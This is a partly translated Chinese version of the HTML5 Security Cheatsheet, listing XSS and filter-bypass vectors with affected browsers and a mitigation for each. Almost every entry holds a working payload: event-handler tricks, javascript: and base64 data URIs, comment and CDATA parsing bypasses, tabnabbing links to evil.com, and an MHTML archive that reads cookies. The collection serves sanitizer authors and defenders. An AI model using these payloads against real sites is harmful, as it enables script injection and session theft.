# HTML5 安全备忘单

> 来源：[HTML5 Security Cheatsheet](https://html5sec.org/)

## HTML5 特性向量

### 通过 formaction 属性进行 XSS - 需要用户进行交互 (1)#1test

这个向量展示了通过 HTML5 的 form 和 formaction 从外部劫持表单的一种方法.

```
<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button> 
```

不要让用户提交包含 "form" 和 "formaction"属性的标签.避免在 form 中出现 id 属性及提交按钮.

*   firefox 4.0
*   firefox latest

*   opera 10.5

*   opera latest

*   chrome 10.0

*   chrome latest

*   safari 4.0.4

*   safari latest

*   internet explorer 10

*   internet explorer latest (inside form element)

*   xss

*   html5
*   opera
*   chrome
*   firefox
*   formaction
*   javascript
*   button

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction`](http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction)

reporter：.mario

### 通过 autofocus 属性执行本身的 focus 事件#7test

这个向量是使焦点自动跳到输入元素上,触发焦点事件 - 无需用户交互

```
<input onfocus=write(1) autofocus> 
```

检测用户提交的内容中是否含有"autofocus"属性

*   firefox 4.0
*   firefox latest

*   opera 9.0

*   opera latest

*   safari 4.0

*   safari latest

*   chrome 4.0

*   chrome latest

*   internet explorer 10.0

*   internet explorer latest

*   xss

*   autofocus
*   chrome
*   opera

*   [`www.w3.org/Bugs/Public/show_bug.cgi?id=9602`](http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602)

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control`](http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control)

reporter：Gareth

### 通过多个 autofocus 竞争焦点来触发 blur 事件#8test

这里我们有两个 HTML input 元素竞争焦点,但焦点到另一个 input 元素时,前面那个将会触发 blur 事件

```
<input onblur=write(1) autofocus><input autofocus> 
```

检测用户提交的内容中是否含有"autofocus"属性

*   safari 4.0
*   safari latest

*   chrome 4.0

*   chrome latest

*   xss

*   autofocus
*   blur
*   chrome
*   safari

*   [`www.w3.org/Bugs/Public/show_bug.cgi?id=9602`](http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602)

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control`](http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control)

reporter：.mario

### 通过<VIDEO>的 poster 属性执行 Javascript#10test

Opera 10.5+的 poster 属性允许使用 javascript: URI.这个 bug 在 opera11 中已修复

```
<video poster=javascript:alert(1)//></video> 
```

确保 VIDEO 的 poster 属性是相对 URI、http URI 和 MIME-typed 正确的 data URI

*   opera 10.5
*   opera 11.01

*   xss

*   poster
*   video
*   opera
*   html5

reporter：.mario

### 通过 autofocus 触发<Body>的 onscroll 执行 Javascript.#12test

这个向量是使用 autofocus 移开焦点的方式来移动滚动条,这样就触发了<BODY>的 onscroll 事件

```
<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus> 
```

*   firefox 4.0
*   firefox latest

*   opera 9.0

*   opera latest

*   safari 4.0

*   safari latest

*   chrome 4.0

*   chrome latest

*   xss

*   autofocus
*   scroll
*   chrome
*   opera

*   [`www.w3.org/Bugs/Public/show_bug.cgi?id=9602`](http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602)

reporter：.mario

### Form surveillance with onformchange, onforminput and form attributes#23test

Enter a value into the form element to see how "onforminput" and "onformchange" attributes can monitor <FORM> activity - even from outside the <FORM> via the form attribute on a <BUTTON> element.

```
<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button> 
```

Make sure users cannot submit markup including the form, "onformchange" and "onforminput" attributes. Do not apply <FORM> elements with an "id" attribute.

*   opera 10.5
*   opera 12.0

*   surveillance

*   javascript
*   opera
*   html5
*   onforminput
*   onformchange

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#broadcast-formchange-events`](http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#broadcast-formchange-events)

reporter：Skyphire, .mario

### JavaScript execution via <VIDEO> and <SOURCE> tag (1)#55test

Opera 10.5+ and Chrome allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags

```
<video><source onerror="alert(1)"> 
```

Make sure user submitted <SOURCE> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.

*   opera 10.5
*   opera latest

*   chrome 4.0

*   chrome latest

*   firefox 4.0

*   firefox latest

*   xss

*   javascript
*   video
*   source
*   html5
*   opera
*   chrome
*   audio

reporter：.mario

### JavaScript execution via <VIDEO> and <SOURCE> tag (2)#56test

Firefox 3.5+ allows error handlers in <VIDEO> tags when applied with a <SOURCE> tag. The same works for <AUDIO> tags. On Firefox 4+ the <SOURCE> tag is irrelevant to trigger the error event. This happens because of the implicit "src" attribute in <VIDEO> tag when the page has a number sign (#) in the URL.

```
<video onerror="alert(1)"><source></source></video> 
```

Make sure user submitted <AUDIO> and <VIDEO> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.

*   firefox 3.5
*   firefox latest

*   internet explorer 9.0

*   internet explorer latest

*   xss

*   javascript
*   video
*   source
*   html5
*   firefox
*   audio

reporter：.mario

### XSS via formaction - requiring user interaction (2)#72test

A vector displaying the HTML5 "formaction" capabilities for form hijacking. Note that this variation does not use the "id" and "form" attributes to connect button and form.

```
<form><button formaction="javascript:alert(1)">X</button> 
```

Don't allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes.

*   firefox 4.0
*   firefox latest

*   opera 10.5

*   opera latest

*   chrome 10.0

*   chrome latest

*   safari 4.0.4

*   safari latest

*   internet explorer 10.0

*   internet explorer latest

*   xss

*   html5
*   opera
*   formaction
*   javascript
*   button

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction`](http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction)

reporter：.mario

### Passive JavaScript execution via <BODY> and oninput attribute#86test

All browsers besides Internet Explorer 9↓ support the "oninput" event handler around form elements like the given <INPUT>. The event works for the form elements itself, the surrounding form and <BODY> as well as <HTML> tags.

```
<body oninput=alert(1)><input autofocus> 
```

Do not whitelist "oninput" attributes in user submitted markup.

*   firefox 3.6
*   firefox latest

*   safari 4.0

*   safari latest

*   chrome 4.0

*   chrome latest

*   opera 9.0

*   opera latest

*   internet explorer 10.0

*   internet explorer latest

*   xss

*   javascript
*   html5
*   oninput
*   form
*   passive
*   event

reporter：Skyphire

### Passive JavaScript execution via MathML on Firefox#130test

Modern Firefox versions allow usage of inline MathML. While other user agents don't support the href attribute for MathML elements (yet), Firefox does and thereby enables passive JavaScript execution. Note that supporting href for MathML elements is a feature - introduced with MathML 3\. The same effect can be observed by using xlink:href. The statusline action further enables obfuscation of the actual link target - and in this example hides the JavaScript URI.

```
<math href="javascript:alert(1)">CLICKME</math> <math> <!-- up to FF 13 --> <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction> <!-- FF 14+ --> <maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction> </math> 
```

Do not allow users to submit unfiltered MathML content.

*   firefox 6
*   firefox latest

*   mathml

*   xss
*   inline
*   firefox

*   [`www.w3.org/Math/`](http://www.w3.org/Math/)

*   [`bugzilla.mozilla.org/show_bug.cgi?id=534968`](https://bugzilla.mozilla.org/show_bug.cgi?id=534968)
*   #87

reporter：.mario, LeverOne

### Transparent overwriting of request-data using HTML5 "dirname" attributes#136test

Opera and Chrome support the HTML5 attribute "dirname", that can be used to have the browser communicate the text-flow direction of another input element by adding it to the server-sent request body. By injecting a "dirname" attribute in an existing form, an attacker can overwrite user input and thereby make it guessable for malicious purposes. The overwritten value would then be "ltr" or "rtl" - depending on the actual text-flow direction. The "dirname" attribute is not yet supported by Internet Explorer or Firefox.

```
<form action="" method="post"> <input name="username" value="admin" /> <input name="password" type="password" value="secret" /> <input name="injected" value="injected" dirname="password" /> <input type="submit"> </form> 
```

Avoid white-listing the "dirname" attribute in user generated content. The effects on existing forms are hard to predict and might cause privacy problems and information leaks.

*   opera 12.0

*   chrome 22.0

*   chrome latest

*   html5

*   dirname
*   privacy
*   http
*   form
*   infoleak

*   [`dev.w3.org/html5/spec/common-input-element-attributes.html#the-dirname-attribute`](http://dev.w3.org/html5/spec/common-input-element-attributes.html#the-dirname-attribute)

*   [`html5sec.org/dirname/`](http://html5sec.org/dirname/)

reporter：.mario

### Executing JavaScript via cross-origin HTML imports#138test

Google Chrome Canary already supports HTML Imports. They allow to fetch resources from arbitrary origins (as long as the Access-Control-Origin headers are set properly) and inject it into the requesting DOM. Currently, only Chrome supports the feature and it's still hidden behind a flag. It is however to be expected to be supported by all major browsers.

```
<link rel="import" href="test.svg" /> 
```

Make sure that HTML imports are limited to the same origin. Avoid permitting users to have <link> tags in user-generated rich-text as they can now directly execute JavaScript without any user interaction.

*   chrome 33.0
*   chrome latest

*   opera latest

*   html5

*   imports
*   link
*   rel
*   xss
*   active

*   [`www.w3.org/TR/html-imports/`](http://www.w3.org/TR/html-imports/)

*   [`html5sec.org/cspbypass/`](http://html5sec.org/cspbypass/)

reporter：.mario

### Executing JavaScript via "srcdoc" attribute in Iframes#139test

HTML5 specifies a "srcdoc" attribute for Iframes. This attribute, quite similar to data URIs, is capable of hosting HTML text to be rendered by the browser as the content of the Iframe. The pseudo-document created by the "srcdoc" attribute has full access to the hosting domain, although it runs in an artificial origin. This attribute should if at all only be used in combination with the Iframe Sandbox.

```
<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" /> 
```

Make sure to use "srcdoc" only in combination with the Iframe Sandbox. Otherwise, XSS attacks might slip through existing filters' rules as the payload can be HTML encoded.

*   firefox 26.0
*   firefox latest

*   chrome 20.0

*   chrome latest

*   opera 15.0

*   opera latest

*   html5

*   iframe
*   sandbox
*   srcdoc
*   xss
*   active
*   entities

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-srcdoc`](http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-srcdoc)

*   [`developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)

reporter：.mario

### HTML5 <picture> element and "srcset" attributes#142test

HTML5 offers the <picture> element for responsive and accessible images. The <picture> element essentially wraps <source> and <img> elements and provides a way to offer alternative content. Novel here is that the "srcset" attribute allows to trigger load events. This is likely to bypass existing WAF systems.

```
<picture><source srcset="x"><img onerror="alert(1)"></picture> <picture><img srcset="x" onerror="alert(1)"></picture> <img srcset=",,,,,x" onerror="alert(1)"> 
```

In case a black-list based XSS filter is in use, make sure that the combination of event handler and "srcset" attribute is detected by it as well.

*   chrome 38.0
*   chrome latest

*   internet explorer Spartan

*   picture

*   srcset
*   html5
*   accessibility

*   [`www.whatwg.org/specs/web-apps/current-work/multipage/embedded-content.html#the-picture-element`](http://www.whatwg.org/specs/web-apps/current-work/multipage/embedded-content.html#the-picture-element)

*   [`responsiveimages.org/`](http://responsiveimages.org/)

reporter：.mario

### Bypassing window.opener protection of rel="noreferrer"#143test

In many situations, a developer might want to mitigate tab-nabbing attacks that are using window.opener and its writable location object. To do so, it is recommended to apply external links with a rel="noreferrer" attribute. Depending on how the external links are embedded, the protection might however fail - and window.opener might not be null but still be exposed. The problem here is, that rel attributes only work for <a> and <area>. Links and link-like navigation features can however be embedded in multiple other ways. Further note, that MSIE pretty much ignores the standard and doesn't destroy window.opener without further effort.

```
<a href="//evil.com" target="_blank" rel="noreferrer">CLICK</a> // window.opener will be null <map><area href="//evil.com" target="_blank" rel="noreferrer">CLICK</area></map> // window.opener will be null <svg><a xlink:href="//evil.com" rel="noreferrer">CLICK</a></svg> // window.opener still works <form action="//evil.com" target="_blank" rel="noreferrer"><input type="submit"></form>// window.opener still works <form id="test" rel="noreferrer"></form><button form="test" formtarget="_blank" formaction="//evil.com">CLICKME</button>// window.opener still works <math href="//evil.com" xlink:show="new" rel="noreferrer">CLICKME</math>// window.opener still works 
```

Do not rely on the noreferrer attribute value alone, but rather use a dedicated de-referrer page that in additon deactivates window.opener using window.opener.**proto**=null.

*   chrome 4.0
*   chrome latest

*   opera 9.0

*   opera latest

*   internet explorer 6.0

*   internet explorer latest

*   firefox 1.x

*   firefox latest

*   safari 4.0

*   safari latest

*   referrer

*   opener
*   html5
*   location
*   tabnabbing

*   [`code.google.com/p/chromium/issues/detail?id=45008#c1`](https://code.google.com/p/chromium/issues/detail?id=45008#c1)

*   [`code.google.com/p/chromium/issues/detail?id=162774`](https://code.google.com/p/chromium/issues/detail?id=162774)
*   [`github.com/molnarg/tabnabbing-demo`](https://github.com/molnarg/tabnabbing-demo)

reporter：.mario

### Generating greater-than with HTML5 Named Character References#144test

Some of the HTML5 Named Character references generate two ASCII characters, such as <⃒ and >⃒. This can in some exotic scenarios be abused to generate valid HTML without actually closing a tag with an ASCII greater-than. The entity will produce the greater-than so we do not have to.

```
<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe> <a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a> 
```

Be very careful when HTML attributes are used to carry HTML data that is later being used on the website. When entities are accepted, some HTML entities can produce dangerous characters even if they don't look like it on first sight.

*   chrome 4.0
*   chrome latest

*   opera 12.0

*   opera latest

*   internet explorer 9.0

*   internet explorer latest

*   firefox 4.x

*   firefox latest

*   safari 4.0

*   safari latest

*   entity

*   character reference
*   html5
*   iframe

*   [`developers.whatwg.org/named-character-references.html#named-character-references`](https://developers.whatwg.org/named-character-references.html#named-character-references)

reporter：.mario

## HTML4 和一些老的向量

### JavaScript execution via <FRAMESET> and onload#31test

This classic vector shows that several tags don't need a "src" attribute to fire onload events, such as <IFRAME>, <BODY> and <FRAMESET>.

```
<frameset onload=alert(1)> 
```

Be sure to work with whitelists when allowing users to submit markup - else ancient tags like <FRAMESET> might be forgotten to filter and escape.

*   internet explorer 5.0
*   internet explorer latest

*   opera 8.x

*   opera latest

*   firefox 1.x

*   firefox latest

*   chrome 3.0

*   chrome latest

*   safari 3.0

*   safari latest

*   xss

*   javascript
*   frames
*   classic
*   html
*   onload

reporter：.mario

### JavaScript execution via <TABLE> and background#32test

Opera 8-10.5+ as well as Internet Explorer 6 support JavaScript URIs for <TABLE> and some other tags' "background" attributes. This causes JavaScript execution without user interaction. The problem has been fixed in Opera 11.

```
<table background="javascript:alert(1)"></table> 
```

In case evil attributes like event handlers are being filtered from user submitted markup make sure not to forget "background" - among others.

*   internet explorer 6.0

*   opera 8.x

*   opera 11.01

*   xss

*   javascript
*   background
*   classic
*   html
*   table

reporter：.mario

### HTML comment parsing issues (1)#37test

This vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.

```
<!--<img src="--><img src=x onerror=alert(1)//"> 
```

Make sure comments are not allowed in user submitted html. The markup should be checked for security issues after comments have been stripped out - not before.

*   internet explorer 5.0
*   internet explorer latest

*   opera 8.0

*   opera latest

*   firefox 1.0

*   firefox latest

*   chrome 3.0

*   chrome latest

*   safari 3.0

*   safari latest

*   xss

*   javascript
*   comment
*   parsing
*   attributes

reporter：sirdarckcat, .mario

### HTML comment parsing issues (2)#38test

Besides <!---> the Internet Explorer allows to use <COMMENT> tags. The vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments. This example works up to IE 8 standards mode.

```
<comment><img src="</comment><img src=x onerror=alert(1)//"> 
```

Make sure <COMMENT> tags are not allowed in user submitted html. The markup should be checked for security issues after <COMMENT> tags have been stripped out or escaped - not before.

*   internet explorer 5.0
*   internet explorer latest (in older docmode)

*   xss

*   javascript
*   comment
*   parsing
*   attributes

reporter：.mario

### CDATA section parsing issues#39test

Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form "<![" as well as including padding like "<![CDATA[". This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation. Firefox 4 and Opera 11.60 have fixed the issue. However, modern browsers have a separate XML parsers for inline SVG or MathML, which allow to use the CDATA sections (including a little irregular shape).

```
<!-- up to Opera 11.52, FF 3.6.28 --> <![><img src="]><img src=x onerror=alert(1)//"> <!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+ --> <svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg> 
```

Make sure CDATA delimiters are not allowed in user submitted html. The markup should be checked for security issues after CDATA sections nd delimiters have been stripped out or escaped - not before.

*   opera 8.0
*   opera latest

*   firefox 1.x

*   firefox latest

*   internet explorer 9.0

*   internet explorer latest

*   chrome 7.0

*   chrome latest

*   safari 4.0.4

*   safari latest

*   xss

*   javascript
*   cdata
*   parsing
*   attributes
*   math
*   svg
*   inline

reporter：LeverOne

### Plaintext tags used for markup obfuscation#40test

This vector works on all tested user agents and shows how several filtering solutions can be tricked into accepting malicious HTML. A badly written filter will assume the error handler is part of the first image's "src" attribute and accept the incoming data.

```
<style><img src="</style><img src=x onerror=alert(1)//"> 
```

Don't rely on weak regular express for markup filtering. Use whitelists for allowed tags and rely on a filter solution based on a heavily tested tokenizer/parser.

*   internet explorer 5.0
*   internet explorer latest

*   opera 8.x

*   opera latest

*   firefox 1.x

*   firefox latest

*   chrome 3.0

*   chrome latest

*   safari 3.0

*   safari latest

*   xss

*   javascript
*   plaintext
*   tags
*   parsing
*   attributes

reporter：LeverOne

### Error handler via empty list-style and load handler via empty content#41test

Opera 10.5+ and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well. Also works combination like content:url(svg), but at the moment it is sensitive to events and <script> tags before and after.

```
<li style=list-style:url() onerror=alert(1)></li> <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div> 
```

*   opera 8.0
*   opera 12.0

*   xss

*   javascript
*   css
*   background
*   opera
*   onerror
*   content

reporter：LeverOne, .mario

### Link hijacking via <BASE> and JavaScript URI#42test

<BASE> link hijacking with JavaScript URIs works on Internet Explorer, Opera (O8-10.5 in case the link URL starts with #) and Safari. User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents. Opera 11 ships a more or less working fix, but this problem continues to exist in difficult to exploit forms though.

```
<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body> 
```

User submitted HTML should not allow usage of <BASE> tags. In case they are necessary no non-HTTP/non-relative URL schemes should be allowed.

*   opera 8.x
*   opera 10.63

*   safari 3.0

*   safari 5.1.7

*   internet explorer 5.5

*   internet explorer 8.0

*   xss

*   javascript
*   opera
*   internet explorer
*   base
*   hijacking

reporter：brainpillow, Gareth, .mario

### JavaScript execution via <SCRIPT> for and event attributes#48test

Internet Explorer allow using <SCRIPT> tags with "for" and "event" attributes to bind event data to specific html elements. The two shown attribute values cause script execution without user interaction. Opera simply ignores these attributes.

```
<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT> 
```

*   opera 10.0
*   opera 12.0

*   internet explorer 6.0

*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   opera
*   for
*   event
*   internet explorer

reporter：.mario

### JavaScript execution via <OBJECT> DataURL attribute#49test

Internet Explorer 9 and - in some situations - earlier versions support the use of JavaScript URIs for the "dataurl" attribute of a TDC Object. The JavaScript will be executed without user any interaction.

```
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> 
```

*   internet explorer 6.0
*   internet explorer 9.0

*   xss

*   javascript
*   internet explorer
*   object
*   dataurl
*   TDC

*   [`msdn.microsoft.com/en-us/library/ms531356%28v=VS.85%29.aspx#Understanding_the_TDC_Object_Model`](http://msdn.microsoft.com/en-us/library/ms531356%28v=VS.85%29.aspx#Understanding_the_TDC_Object_Model)

reporter：.mario

### JavaScript execution via <OBJECT> data#50test

Almost all browsers supporting data URIs allow executing JavaScript via crafted <OBJECT> "data" attribute value - even if base64 encoded. Note however, that different browsers execute the JavaScript on different origins. Firefox for instance will execute on the hosting domain and thus allow XSS, while Chrome will execute on about:blank.

```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object> 
```

Make sure user submitted HTML cannot contain <OBJECT> tags or only whitelisted <OBJECT> "data" values.

*   opera 8.x
*   opera latest

*   firefox 1.x

*   firefox latest

*   chrome 3.0

*   chrome latest

*   safari 4.0

*   safari latest

*   xss

*   javascript
*   opera
*   chrome
*   embed
*   safari
*   src
*   firefox
*   base64

reporter：.mario

### JavaScript execution via <EMBED> src#51test

Almost all browsers supporting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.

```
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed> 
```

Make sure user submitted HTML cannot contain <EMBED> tags or only whitelisted <EMBED> "src" values.

*   opera 8.x
*   opera latest

*   chrome 3.0

*   chrome latest

*   safari 4.0

*   safari latest

*   xss

*   javascript
*   opera
*   chrome
*   embed
*   safari
*   src
*   base64

reporter：.mario

### Tags nested in other tags to trick filters#57test

Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn't.

```
<b <script>alert(1)//</script>0</script></b> 
```

This vector is ideal to trick regular expression based HTML filters and sanitizers. Make sure your filters are aware of the fact that some user agents evaluate <b <script> while others will prefer <b><script>.

*   firefox 3.5
*   firefox 3.6.28

*   chrome 4.0

*   chrome 5.0

*   safari 3.0

*   safari 4.0.3

*   xss

*   javascript
*   nesting
*   script
*   parser
*   regex

reporter：.mario, Kyo, sirdarckcat

### XSS using accent grave when copying innerHTML (1)#59test

Internet Explorer treats the accent grave (`) as an attribute delimiter like " and '. The quotation mark (") will be stripped from the attribute value when using the innerHTML property in case it doesn't contain space.

```
<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script> 
```

Make sure the HTML filter you use is aware of the fact that the accent grave is a valid attribute delimiter for IE too - especially if users are allowed to post harmless JavaScript (JSReg, Google Caja). Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it's supposed to.

*   internet explorer 6.0
*   internet explorer 8.0 (unpatched)

*   xss

*   javascript
*   internet explorer
*   script
*   dom
*   innerhtml

*   #97

*   #98
*   #128

reporter：hasegawayosuke

### Simulating attributes in IE#62test

This vector simulates an attribute in IE by using a single quote to trick filters. This works up to IE9 in standards mode and in latest IE using older document modes.

```
<!-- IE 6-8 --> <x '="foo"><x foo='><img src=x onerror=alert(1)//'> <!-- IE 6-9 --> <! '="foo"><x foo='><img src=x onerror=alert(2)//'> <? '="foo"><x foo='><img src=x onerror=alert(3)//'> 
```

*   internet explorer 6.0
*   internet explorer latest (in older docmodes)

*   xss

*   javascript
*   attribute
*   simulating
*   parser
*   regex

*   #102

*   #108
*   #133

reporter：Algol, jackmasa, LeverOne, White Jordan

### JavaScript execution via src attribute#63test

Most browsers allow executing JavaScript via <IFRAME> "src" attributes - this is expected behavior. Interesting is though that this can be extended to other tags too. Opera 10, Chrome and Firefox execute JavaScript by using the <EMBED> tag while Opera 10 and Opera Mobile even execute JavaScript with <SCRIPT>, <IMG> and <IMAGE> and a matching "src" attribute as well as early Internet Explorer versions.

```
<embed src="javascript:alert(1)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF <img src="javascript:alert(2)"> <image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓ <script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓ 
```

Make sure "src" attributes can never contain non-HTTP-URLs to prevent XSS or worse.

*   firefox 3.0
*   firefox latest

*   chrome 4.0

*   chrome 6.0

*   opera 8.x

*   opera 11.01

*   internet explorer 6.0

*   xss

*   javascript
*   src
*   safari
*   chrome
*   opera
*   firefox
*   internet explorer

reporter：.mario

### JavaScript execution via IE filters and onfilterchange#70test

In some situations it's possible to trigger a filterchange event by using just one filter as the example shows. Also the short filter notation is being used which is supported by all IE versions despite the information in the documentation. In compatibility mode to IE8+ you can use the property "-ms-filter".

```
<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div> 
```

*   internet explorer 6.0
*   internet explorer 9.0

*   xss

*   javascript
*   filter
*   css
*   style
*   onfilterchange
*   internet explorer

*   [`msdn.microsoft.com/en-us/library/ms532847%28VS.85%29.aspx`](http://msdn.microsoft.com/en-us/library/ms532847%28VS.85%29.aspx)

*   [`msdn.microsoft.com/en-us/library/ie/hh801215(v=vs.85).aspx`](http://msdn.microsoft.com/en-us/library/ie/hh801215(v=vs.85).aspx)

reporter：.mario

### <OBJECT> tag and Flash files executing JavaScript#79test

<OBJECT> tags directly including Flash files via the "data" attribute - allowing execution of JavaScript and more without user interaction.

```
<object allowscriptaccess="always" data="test.swf"></object> 
```

Make sure users cannot control the "src" and "data" attribute values of <OBJECT> tags - or better don't whitelist <OBJECT> tags in user submitted markup at all.

```
class XSS {public static function main() { flash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"javascript:alert(1)"),flash.Lib._root.name||"_top"); }}crossdomain: 1path: [`html5sec.org/test.swf`](http://html5sec.org/test.swf)name: test.swf 
```

*   safari 3.0
*   safari latest

*   firefox 1.5

*   firefox latest

*   opera 10.0

*   opera 12.0

*   internet explorer 6.0

*   internet explorer latest

*   xss

*   javascript
*   object
*   flash
*   swf
*   safari
*   firefox
*   opera

*   [`www.w3.org/TR/REC-html40/struct/objects.html`](http://www.w3.org/TR/REC-html40/struct/objects.html)

reporter：.mario

### Special tags parsing issues#91test

The HTML tagnames start with a-zA-Z (abstracting from ignoring null byte from IE). In addition, there are other structures, parsed as a tag (special tags). They begin with the following characters: !,?, /,%. This has its reasons: DTD, comments, xml-declaration, import-instruction in Internet Explorer, closing tags etc. starts by these characters. These examples show that such tags will inherit some properties of their standard models. [A] Firefox, Opera, Google Chrome, Safari (4.0.4↑), IE 10↑ Standards mode: Parameters of the special tags can not contain a closing parenthesis ">". [B] Safari (up to 4.0.3): Parameter of the special tags can be broken only via "?>". [C] Opera (up to 11.52): Special tag inherits the properties of DTD: inside it you can create a section that starts with "[" and ends with "]". [D] IE 9↓ Standards mode, Safari (up to 4.0.3): A sequence like "<% ... %>" is an alternative to comments. These features can be used for obfuscation and bypassing filters. And remember, do not parse as a tag in HTML structure like "<è foo=...>".

```
[A] <? foo="><script>alert(1)</script>"> <! foo="><script>alert(1)</script>"> </ foo="><script>alert(1)</script>"> [B] <? foo="><x foo='?><script>alert(1)</script>'>"> [C] <! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>"> [D] <% foo><x foo="%><script>alert(1)</script>"> 
```

*   internet explorer 5.0
*   internet explorer latest

*   opera 8.x

*   opera latest

*   firefox 1.x

*   firefox latest

*   chrome 3.0

*   chrome latest

*   safari 3.0

*   safari latest

*   xss

*   tagname
*   internet explorer
*   opera
*   firefox
*   chrome
*   safari
*   parsing
*   breaking
*   obfuscation
*   closing tag

*   [`sla.ckers.org/forum/read.php?2,15812,28148#msg-28148`](http://sla.ckers.org/forum/read.php?2,15812,28148#msg-28148)

*   #134

reporter：LeverOne, wpulog

### JavaScript execution via MHTML-scheme#96test

This example used the ability to convert the file with any conent type into a web archive using mhtml URI scheme to run JavaScript. For the first time this feature was discovered by Stepanishchev E. in 2006 and became known among web developers as an alternative to data URI for IE6-7\. In 2007, Hasegawa Y. independently proposed a way to use this mhtml feature for XSS. Followed fix was incomplete because it doesn't take into account the possibility of addressing to the contents of the archive using "!value". This possibility as well as the possibility to access from the archive contents to a host domain are used in the example below. Using this vector all sites that do not contain two new lines in the source code and allows users to insert new line were vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web archives could be specified via <IFRAME> or location.href and comparable. This example was published in June 2010, fix released in April 2011\. The mhtml URI scheme doesn't determine the content type now, but archive contents still has access to the host domain.

```
<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe> <iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>``<html> <body> <b>some content without two new line \n\n</b> Content-Type: multipart/related; boundary="******"<b>some content without two new line</b> --****** Content-Location: xss.html Content-Transfer-Encoding: base64 PGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1 cmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9 dXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy YW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg --******-- </body> </html>crossdomain: 1path: [`html5sec.org/test.html`](http://html5sec.org/test.html)name: test.html 
```

*   internet explorer 5.0
*   internet explorer 10.0

*   xss

*   internet explorer
*   archive
*   mhtml

*   [`en.wikipedia.org/wiki/MHTML`](http://en.wikipedia.org/wiki/MHTML)

*   [`bolknote.ru/2006/08/24/~312/`](http://bolknote.ru/2006/08/24/~312/)
*   [`openmya.hacker.jp/hasegawa/security/ms07-034.txt`](http://openmya.hacker.jp/hasegawa/security/ms07-034.txt)
